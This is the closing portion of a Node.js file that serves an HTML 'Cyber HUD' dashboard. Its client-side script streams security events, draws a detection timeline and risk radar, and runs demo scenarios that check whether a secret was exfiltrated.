        badge.style.color = 'var(--accent-green)';
      }
      if (descText && desc) {
        desc.textContent = descText;
      }
    }

    function addTimelineEvent(ev) {
      const feed = document.getElementById('eventTimeline');
      const card = document.createElement('div');
      const isBlocked = ev.decision === 'BLOCKED' || ev.severity === 'CRITICAL';
      const isAllow = ev.decision === 'ALLOW';

      card.className = 'event-card ' + (isBlocked ? 'blocked' : (isAllow ? 'allow' : ''));

      const pillarNames = ['', 'P1: INODE', 'P2: AST', 'P3: MIRAGE', 'P4: BRAIN', 'P5: GUARD'];
      const pillarLabel = pillarNames[ev.pillar] || ('P' + (ev.pillar || ''));

      const timeStr = new Date(ev.timestamp || Date.now()).toLocaleTimeString();

      let evidenceHtml = '';
      if (ev.evidence && Object.keys(ev.evidence).length > 0) {
        evidenceHtml = \`
          <details class="evidence-box">
            <summary>Expand Technical Evidence</summary>
            <pre class="evidence-json">\${JSON.stringify(ev.evidence, null, 2)}</pre>
          </details>
        \`;
      }

      card.innerHTML = \`
        <div class="event-card-header">
          <div style="display: flex; gap: 0.4rem; align-items: center;">
            <span class="pillar-tag">\${pillarLabel}</span>
            <span style="font-weight: 700; color: \${isBlocked ? 'var(--accent-red)' : (isAllow ? 'var(--accent-green)' : 'var(--accent-cyan)')}">
              \${ev.event || 'SECURITY_EVENT'}
            </span>
          </div>
          <span class="event-time">\${timeStr}</span>
        </div>
        <div class="event-msg">\${ev.message || ''}</div>
        \${evidenceHtml}
      \`;

      feed.insertBefore(card, feed.firstChild);

      if (ev.pillar) {
        updatePillarCard(ev.pillar, ev.decision, ev.message);
      }
      if (ev.evidence && ev.evidence.vector) {
        currentVector = ev.evidence.vector;
        drawRadar(currentVector);
      }
    }

    // SSE Stream Consumer
    const evtSource = new EventSource('/api/stream');
    evtSource.onmessage = (e) => {
      try {
        const data = JSON.parse(e.data);
        if (data.type === 'ARENA_EVENT') {
          addTimelineEvent(data);
          if (data.decision === 'BLOCKED') {
            updateRiskScore(100, true);
          } else if (data.decision === 'ALLOW' && data.pillar === 5) {
            updateRiskScore(data.evidence?.riskScore || 5, false);
          }
        } else if (data.type === 'EVALUATION') {
          updateRiskScore(data.riskScore, data.verdict === 'BLOCKED');
          if (data.behavioralVector) drawRadar(data.behavioralVector);
        } else if (data.type === 'ARENA_RESET') {
          resetUiState();
        }
      } catch (err) {}
    };

    async function runScenario(scenario) {
      const btnSafe = document.getElementById('btnSafe');
      const btnInj = document.getElementById('btnInjection');
      btnSafe.disabled = true;
      btnInj.disabled = true;

      try {
        const res = await fetch('/api/demo/run', {
          method: 'POST',
          headers: { 'Content-Type': 'application/json' },
          body: JSON.stringify({ scenario })
        });
        const data = await res.json();
        if (data.result) {
          updateRiskScore(data.result.riskScore, data.result.verdict === 'BLOCKED');
          
          // Query programmatic verification endpoint
          const verifRes = await fetch('/api/demo/verify?runId=' + data.runId);
          const verifData = await verifRes.json();
          if (verifData.verification) {
            document.getElementById('verifBytes').textContent = verifData.verification.bytesReceived + ' bytes';
            document.getElementById('verifPackets').textContent = verifData.verification.payloadsReceived + ' packets';
            document.getElementById('verifSecret').textContent = verifData.verification.secretExfiltrated 
              ? 'LEAKED (FAILURE)' 
              : 'CONFIDENTIAL (100% PREVENTED)';
          }
        }
      } catch (e) {
        alert('Arena error: ' + e.message);
      } finally {
        btnSafe.disabled = false;
        btnInj.disabled = false;
      }
    }

    async function resetDemo() {
      try {
        await fetch('/api/demo/reset', { method: 'POST' });
        resetUiState();
      } catch (e) {
        alert('Reset error: ' + e.message);
      }
    }

    function resetUiState() {
      for (let p = 1; p <= 5; p++) {
        const card = document.getElementById('cardPillar' + p);
        const badge = document.getElementById('badgePillar' + p);
        if (card) card.classList.remove('active-safe', 'active-blocked');
        if (badge) {
          badge.textContent = 'READY';
          badge.style.background = 'rgba(148, 163, 184, 0.1)';
          badge.style.color = 'var(--text-muted)';
        }
      }
      document.getElementById('verifBytes').textContent = '0 bytes';
      document.getElementById('verifPackets').textContent = '0 packets';
      document.getElementById('verifSecret').textContent = 'CONFIDENTIAL (100% PREVENTED)';
      updateRiskScore(0, false);
      currentVector = [0.08, 0.08, 0.08, 0.08, 0.08, 0.08, 0.08, 0.08, 0.08, 0.08];
      drawRadar(currentVector);
    }

    drawRadar(currentVector);
    updateRiskScore(0, false);
  </script>
</body>
</html>`;
}

if (require.main === module) {
  const hud = new CyberHudServer();
  hud.start().catch((err) => {
    console.error('Failed to start Cyber HUD:', err);
    process.exit(1);
  });
}

module.exports = { CyberHudServer };
